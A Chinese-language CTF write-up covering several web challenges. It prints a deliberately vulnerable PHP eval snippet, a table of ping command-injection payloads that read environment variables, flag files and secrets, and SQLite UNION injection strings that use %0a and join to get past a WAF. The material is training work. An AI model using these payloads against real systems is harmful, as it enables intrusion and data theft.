**真的是签到诶**

题目直接给了源码：
```
<?php
highlight_file(__FILE__);

$cipher = $_POST['cipher'] ?? '';

function atbash($text) {
  $result = '';
  foreach (str_split($text) as $char) {
    if (ctype_alpha($char)) {
      $is_upper = ctype_upper($char);
      $base = $is_upper ? ord('A') : ord('a');
      $offset = ord(strtolower($char)) - ord('a');
      $new_char = chr($base + (25 - $offset));
      $result .= $new_char;
    } else {
      $result .= $char;
    }
  }
  return $result;
}

if ($cipher) {
  $cipher = base64_decode($cipher);
  $encoded = atbash($cipher);
  $encoded = str_replace(' ', '', $encoded);
  $encoded = str_rot13($encoded);
  @eval($encoded);
  exit;
}

$question = "真的是签到吗？";
$answer = "真的很签到诶！";

$res =  $question . "<br>" . $answer . "<br>";
echo $res . $res . $res . $res . $res;

?>
```
这里第一块就是atbash的定义，然后后面是解码顺序，还有一个对空格的过滤，这个直接用tab键绕过就行，bake一下：

<img width="1737" height="941" alt="image" src="https://github.com/user-attachments/assets/86d53704-eadb-4eae-9638-16836b59bdbf" />

后面就不贴出来了。





**搞点哦润吉吃吃🍊**

进去之后发现是一个登录界面，稍微尝试了一下好像没啥东西，看一下源代码发现账户密码：

<img width="1259" height="203" alt="image" src="https://github.com/user-attachments/assets/b026d5f4-3447-4fbb-9330-3cd512fca8cb" />

进去之后让我们算token,提示抓包那就抓个包，看到有提示，unicode转码一下：

<img width="2413" height="986" alt="image" src="https://github.com/user-attachments/assets/ce188ecb-816d-4cd9-94a1-01f53047973f" />

session每次都是动态刷新的，来自于访问/home时的session....应该写脚本的，但我不会先跳过这里..






**DD 加速器**

依旧是ping，但是其实我ping有关的符号搞的不是很清楚，这里题目过完再重新捋一遍：

<img width="1986" height="630" alt="image" src="https://github.com/user-attachments/assets/6a845c37-de71-4ab8-ae3c-6b90a8f8f284" />

....那就找一下环境变量：

<img width="2147" height="901" alt="image" src="https://github.com/user-attachments/assets/3b01db93-b8bf-4c64-874f-9f57c24568f0" />

这里的env是列出当前 shell 的所有环境变量（比如 PATH、HOME、USER、LANG 等），确实可以看到flag在环境变量中，然后下面对几个符号再梳理一遍

1. ;（分号）—— 最常用、最直接的分隔符

作用：把两条命令串起来，前一条执行完再执行后一条，不管前面成功与否。

| 示例写法 | 实际执行的命令 | 说明 |
| --- | --- | --- |
| `127.0.0.1;env` | `ping 127.0.0.1` 然后 `env` | 最经典的注入方式，用于查看系统环境变量。 |
| `127.0.0.1;ls` | `ping 127.0.0.1` 然后 `ls` | 用于查看当前目录下的文件列表。 |
| `127.0.0.1;cat flag.php` | `ping` 然后读文件 `cat flag.php` | 直接读取名为 `flag.php` 的文件内容。 |
| `127.0.0.1;env\|grep flag` | `ping` 然后过滤含 `flag` 的环境变量 | 常用来在环境变量中查找 `FLAG=xxx` 这种形式的字符串。 |
一句话总结：; 就是“执行完前面，再执行我”。

2. &（单与号）—— 后台运行 + 继续执行

作用：把前面的命令放到后台运行，然后立刻执行后面的命令（不管前面成功与否）

| 示例写法 | 实际执行的命令 | 说明 |
| --- | --- | --- |
| `127.0.0.1 & env` | `ping 127.0.0.1 & env` | ping 在后台跑，马上执行 env |
| `127.0.0.1 & cat flag.php` | `ping` 在后台，马上 `cat` 文件 | 有时比 `;` 更隐蔽（输出可能更干净） |
| `sleep 10 & env` | `sleep 10` 秒后台跑，马上看 `env` | 测试注入是否成功 |
注意：很多 ping 程序会等前面的 ping 结束才输出，所以 & 有时能让后面的命令更快显示。

一句话总结：& 就是“前面的丢到后台去，我要马上执行后面的”。

3. &&（双与号）—— 条件成功才执行

作用：只有前面的命令执行成功（返回码 0），才执行后面的命令。

| 示例写法 | 行为说明 |
| --- | --- |
| `127.0.0.1 && env` | `ping` 成功才执行 `env`（正常 `ping` 通常成功） |
| `ls /flag && cat /flag` | 只有 `/flag` 存在才 `cat` |
| `whoami && id` | 先 `whoami`，成功再 `id` |
一句话总结：&& 就是“前面成功了才执行我”。

4. （管道）—— 把前面的输出给后面的命令

作用：把左边命令的输出，当作右边命令的输入。

| 写法示例 | 左边命令做什么 | 右边命令做什么 | 最终页面看到什么 |
| --- | --- | --- | --- |
| `env,grep flag` | `env`：输出所有环境变量 | `grep flag`：只保留含“flag”的行 | 只显示像 `FLAG=flag{xxx}` 这样的关键行 |
| `env,grep -i flag` | `env`：输出所有环境变量 | `grep -i flag`：忽略大小写搜索 | 能匹配 `flag=`、`Flag=`、`FLAG=` 等 |
| `ls,grep php` | `ls`：列出当前目录文件 | `grep php`：只显示含“php”的文件名 | 只看到 `flag.php`、`index.php` 等 |
| `ls,grep flag` | `ls`：列出文件 | `grep flag`：含“flag”的文件名 | 直接看到 `flag.php`、`flag.txt` 等 |
| `cat flag.php,base64` | `cat flag.php`：读文件内容 | `base64`：把内容转成 base64 编码 | 一串 base64 字符串（如 `ZmxhZ3t4eHh9Cg==`） |
| `cat /flag,base64` | `cat /flag`：读 /flag 文件 | `base64`：编码输出 | base64 编码的 flag 内容 |
| `ls -la,grep ^d` | `ls -la`：详细列出文件（含隐藏） | `grep ^d`：只显示以 d 开头的（目录） | 只看到目录列表 |
| `env,grep -E 'flag,secret,key'` | `env`：所有环境变量 | `grep -E`：正则匹配多个关键词 | 显示含 flag/secret/key 的环境变量 |

md表格里面搞不出管道,将就看一下





**白帽小 K 的故事（1）**

鸣潮好评   跳过剧情之后看到是传一个mp3文件，看一下提示有前端和文件上传字样，还要注意接口，那么就看一下前端，发现有一段特殊的注释：

<img width="1323" height="670" alt="image" src="https://github.com/user-attachments/assets/9a7e91f8-f1f4-4256-ab14-87cd2456c377" />

这里就是一个文件读取接口，成功返回success，然后说只能传MP3，那么我们可以试试直接写php命令....等我再沉淀沉淀




**小 E 的管理系统**

题目描述是带waf的SQL注入，在界面尝试了一下感觉好像都被过滤了，可能注入点不在这里，然后抓了个包看看，发现是这样的：

<img width="932" height="99" alt="image" src="https://github.com/user-attachments/assets/f834e23b-6d8b-4841-99bf-92e82e84d019" />

这里后面是query.php后面再get拼接id，因此我们可以在query路径下执行注入，然后fuzz一波之后过滤了逗号，空格，然后这里用单引号也被waf了，再尝试一下确定是数字型注入，用%0a和join来绕过过滤，后面就是基本的操作了，先查个字段：

<img width="1679" height="542" alt="image" src="https://github.com/user-attachments/assets/36087a68-c9a8-4d56-876b-ce1e1d4a92ba" />

找回显位：
```
?id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)%0ajoin%0a(select%0a2)%0ajoin%0a(select%0a3)%0ajoin%0a(select%0a4)%0ajoin%0a(select%0a5)
```

<img width="2106" height="179" alt="image" src="https://github.com/user-attachments/assets/09431e0d-fe93-41d6-8606-7137ee29fae9" />

可以发现回显位为1，但是后面做不下去了，可能是我还没学到位。。。废了week2没几道做得出来的，这里先给个wp，以后再研究：

```
0%0aunion%0aselect%0a*%0afrom%0a(select%0a1)%0ajoin%0a(select%0a2)%0ajoin%0a(select%0a3)%0ajoin%0a(select%0a4)%0ajoin%0a(select%0agroup_concat(sql)%0afrom%0asqlite_master)
```
<img width="3048" height="190" alt="image" src="https://github.com/user-attachments/assets/be33e998-a68e-476a-a681-2a80a26b4505" />

看着比较重要的是config value，查一下：

```
0%0aunion%0aselect%0a*%0afrom%0a(select%0a1)%0ajoin%0a(select%0a2)%0ajoin%0a(select%0a3)%0ajoin%0a(select%0a4)%0ajoin%0a(select%09group_concat(config_value)%09from%09sys_config)
```
可以直接看到flag：

<img width="1518" height="128" alt="image" src="https://github.com/user-attachments/assets/6c3a6540-3420-413b-bdb2-0accc08fe1ed" />




